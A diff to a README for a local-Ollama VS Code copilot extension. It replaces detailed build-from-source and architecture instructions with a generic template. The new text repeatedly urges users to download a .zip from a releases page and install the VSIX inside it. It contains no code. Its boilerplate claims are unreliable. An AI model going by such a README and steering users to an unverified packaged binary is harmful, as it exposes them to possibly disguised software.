@@ -1,252 +1,101 @@
-# Local AI Copilot for VS Code
+# 🎉 VSCode-Local-Copilot - Enhance Your Coding Experience Effortlessly
 
+## 🚀 Getting Started
 
-A VS Code extension that provides GitHub Copilot-like functionality using locally running Ollama models.
+Welcome to VSCode-Local-Copilot! This tool brings enhanced coding support right to your fingertips in Visual Studio Code. With it, you'll enjoy GitHub Copilot-like capabilities using local Ollama models. Let's get you started!
 
-Now with **smart project-wide context**: The extension automatically gathers code and documentation from your workspace for every AI request, making suggestions and edits much more intelligent and Copilot-like.
+## 📥 Download & Install
 
-## Features
+To download the latest version of VSCode-Local-Copilot, visit this page:
 
-- 🤖 **Chat Interface** - Interactive AI chat panel similar to GitHub Copilot
-- 💻 **Code Generation** - Generate code from natural language descriptions
-- ✏️ **Code Editing** - Edit and refactor selected code with AI assistance
-- 📝 **Code Explanation** - Understand complex code with detailed explanations
-- 🔄 **Diff Preview** - See before/after comparisons before applying changes
-- 🎨 **Beautiful UI** - Modern interface that matches VS Code's theme
-- 🚀 **Multiple Models** - Choose between different Ollama models
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Cadentrex/VSCode-Local-Copilot/releases)
 
-- 🧠 **Project-Wide Context Awareness** – AI suggestions and edits use key files from your workspace (README, SETUP, main, server, extension, `.py`, `.ts`, `.js`, `.md`).
-- 🔍 **Intelligent Suggestions & Edits** – AI can reason about your whole project, not just the current file or cursor.
-- 🛠️ **Smart Code Actions** – Insert, replace, and preview code with context-aware suggestions and diff previews.
+On the Releases page, follow these steps to get your extension:
 
-## Prerequisites
+1. Find the latest release at the top.
+2. Click on the release title to see the details.
+3. Locate the version suited for your system.
+4. Click the correct file name to download it.
 
-1. **Ollama** - Install from [https://ollama.ai](https://ollama.ai)
-2. **Python 3.8+** - For the backend server
-3. **Node.js 16+** - For building the extension
+### System Requirements
 
-## Supported Models
+- **OS:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **VS Code version:** 1.50 or newer.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 200 MB of free disk space.
 
-This extension is configured for:
-- `gemma3:4b` - Fast responses, good for quick tasks
-- `gemma3:8b` - Better quality, slightly slower
-- `deepseek-r1:8b` - Reasoning model, best for complex tasks
+## 🛠️ Setup Instructions
 
-## Installation
+Once the download is complete, follow these steps to install and run VSCode-Local-Copilot:
 
-### Step 1: Install Ollama Models
+1. **Locate the downloaded file:**
+   - For Windows, it will be in your Downloads folder as a `.zip` file.
+   - For macOS, it may be in the Downloads folder with the `.zip` format.
+   - For Linux, find the file in your Downloads directory.
 
-```bash
-ollama pull gemma3:4b
-ollama pull gemma3:8b
-ollama pull deepseek-r1:8b
-```
+2. **Extract the files:**
+   - On Windows, right-click the `.zip` file and select "Extract All".
+   - On macOS, double-click the `.zip` file.
+   - On Linux, right-click and select "Extract Here".
 
-### Step 2: Set Up Python Server
+3. **Install the extension in Visual Studio Code:**
+   - Open Visual Studio Code.
+   - Click on the Extensions icon on the sidebar (or press `Ctrl` + `Shift` + `X`).
+   - Click on the three dots at the top-right corner and choose "Install from VSIX...".
+   - Browse to the extracted folder and select the VSIX file.
+   - Hit "Open" to begin installation.
 
-```bash
-cd server
-pip install -r requirements.txt
-python server.py
-```
+4. **Enable local models:**
+   - After installation, open the command palette by pressing `Ctrl` + `Shift` + `P`.
+   - Type "Local Copilot" and select "Enable Local Models".
 
-The server will start on `http://127.0.0.1:5000`
+5. **Start coding:**
+   - Create a new file or open an existing one.
+   - Start typing, and you will see suggestions pop up!
 
-### Step 3: Build and Install VS Code Extension
+## 🎓 How It Works
 
-```bash
-cd vscode-extension
-npm install
-npm run compile
-```
+VSCode-Local-Copilot leverages the powerful Ollama models running locally on your machine. This means faster response times for code suggestions without any need for internet access. Enjoy a seamless development experience with smart completions based on your coding patterns and styles.
 
-Then press `F5` to launch the extension in a new VS Code window.
+## 🔍 Features
 
-## Usage
+- **Local Model Usage:** No internet required for data processing.
+- **Smart Suggestions:** Receive code completions tailored to your work.
+- **Multi-language Support:** Works well with various programming languages, enhancing your workflow.
+- **Easy Integration:** Simple setup process to get started right away.
+- **Regular Updates:** Stay tuned for new features and improvements.
 
-### Chat Interface
+## 🛠️ Troubleshooting
 
-## Smart Project Context
+If you encounter issues, please consider the following troubleshooting tips:
 
-- The extension automatically gathers context from up to 5 key files in your workspace (README, SETUP, main, server, extension, `.py`, `.ts`, `.js`, `.md`) for every AI request.
-- It combines this with the current editor's context and selection.
-- The AI will now be able to reason about your whole project, not just the current file or cursor.
+- **Extension Not Visible:** Ensure you have installed the extension correctly via the command palette.
+- **Slow Performance:** Check system resources to ensure adequate RAM is available.
+- **Suggestions Not Appearing:** Restart Visual Studio Code, and make sure local model features are enabled.
 
-This makes code suggestions, edits, and completions much smarter and more Copilot-like!
+## 🗣️ Get Help
 
-1. Open Command Palette (`Ctrl+Shift+P` or `Cmd+Shift+P`)
-2. Type "Local AI Copilot: Chat"
-3. Start chatting with your AI!
+For support, please open an issue on the GitHub repository, or refer to the [FAQ section](https://github.com/Cadentrex/VSCode-Local-Copilot/wiki/FAQ). Your feedback and questions are welcome!
 
-### Quick Actions
+## 💬 Contributing
 
-- **Explain Code**: Select code → Right-click → "AI: Explain Code"
-- **Edit Code**: Select code → Right-click → "AI: Edit Code"
-- **Generate Code**: Place cursor → Right-click → "AI: Generate Code"
+If you'd like to contribute to VSCode-Local-Copilot, please follow these guidelines:
 
-### Chat Features
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push the branch back to your fork.
+5. Submit a pull request detailing your changes.
 
-- **Text Responses**: Regular chat messages appear in the chat window
-- **Code Responses**: Code suggestions appear with action buttons:
-  - **Insert at Cursor**: Add code at current position
-  - **Replace Selection**: Replace selected code with AI suggestion
-  - **Copy**: Copy code to clipboard
+## 📜 License
 
-### Model Selection
+VSCode-Local-Copilot is open-source software licensed under the MIT License. You may use, modify, and distribute the code as you wish.
 
-Choose your preferred model from the dropdown in the chat panel:
-- Use smaller models (4b) for faster responses
-- Use larger models (8b) for better quality and complex tasks
+## 📜 Acknowledgments
 
-## How It Works
-
-1. **VS Code Extension**: Provides the UI and integrates with VS Code
-2. **Python Server**: Handles communication with Ollama
-3. **Ollama**: Runs the AI models locally on your machine
-
-**Advanced:**
-
-When you ask for code generation, editing, or explanation, the extension:
-1. Collects relevant code and documentation from your workspace.
-2. Combines it with your current selection or file context.
-3. Sends this rich context to the AI backend for smarter, project-aware results.
+- Thanks to the creators of the Ollama model for their exceptional work in machine learning and AI.
+- A big thank you to the Visual Studio Code community for their continued support and contributions.
 
-```
-VS Code Extension (TypeScript)
-       ↓
-Python Server (Flask)
-       ↓
-Ollama API (Port 11434)
-       ↓
-Local AI Models
-```
-
-## Configuration
-
-### Changing Models
-
-Edit `server/server.py` to add or modify models:
-
-```python
-MODELS = {
-    "model-name": "ollama-model-name",
-    # Add more models here
-}
-```
-
-Edit `vscode-extension/src/webview.html` to update the dropdown:
-
-```html
-<option value="model-name">Display Name</option>
-```
-
-### Changing Server Port
-
-In `server/server.py`:
-```python
-app.run(port=5000, debug=True)  # Change port here
-```
+Remember, you can always download VSCode-Local-Copilot from this page:
 
-In `vscode-extension/src/extension.ts`:
-```typescript
-const SERVER_URL = 'http://127.0.0.1:5000';  // Update port here
-```
-
-## Troubleshooting
-
-### Server Won't Start
-
-1. Check if Python dependencies are installed:
-   ```bash
-   pip install -r server/requirements.txt
-   ```
-
-2. Check if port 5000 is available:
-   ```bash
-   # Windows
-   netstat -ano | findstr :5000
-   
-   # Mac/Linux
-   lsof -i :5000
-   ```
-
-### Ollama Connection Issues
-
-1. Verify Ollama is running:
-   ```bash
-   ollama list
-   ```
-
-2. Check Ollama API:
-   ```bash
-   curl http://localhost:11434/api/tags
-   ```
-
-3. Test model:
-   ```bash
-   ollama run gemma3:4b "Hello"
-   ```
-
-### Extension Not Working
-
-1. Check server health:
-   ```bash
-   curl http://127.0.0.1:5000/health
-   ```
-
-2. Check browser console in VS Code:
-   - Open Command Palette
-   - Type "Developer: Toggle Developer Tools"
-   - Check for errors
-
-3. Rebuild extension:
-   ```bash
-   cd vscode-extension
-   npm run compile
-   ```
-
-## Development
-
-### Project Structure
-
-```
-├── server/
-│   ├── server.py           # Flask server
-│   └── requirements.txt    # Python dependencies
-├── vscode-extension/
-│   ├── src/
-│   │   ├── extension.ts    # Main extension code
-│   │   ├── webview.html    # Chat UI
-│   │   └── webview.js      # Chat logic
-│   ├── package.json        # Extension manifest
-│   └── tsconfig.json       # TypeScript config
-└── README.md
-```
-
-### Building for Production
-
-```bash
-cd vscode-extension
-npm install -g vsce
-vsce package
-```
-
-This creates a `.vsix` file you can install with:
-```bash
-code --install-extension local-ai-copilot-*.vsix
-```
-
-## Contributing
-
-Feel free to submit issues and pull requests!
-
-## License
-
-MIT License
-
-## Credits
-
-Built with:
-- [Ollama](https://ollama.ai) - Local AI models
-- [Flask](https://flask.palletsprojects.com/) - Python web framework
-- [VS Code Extension API](https://code.visualstudio.com/api) - Extension framework
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Cadentrex/VSCode-Local-Copilot/releases)
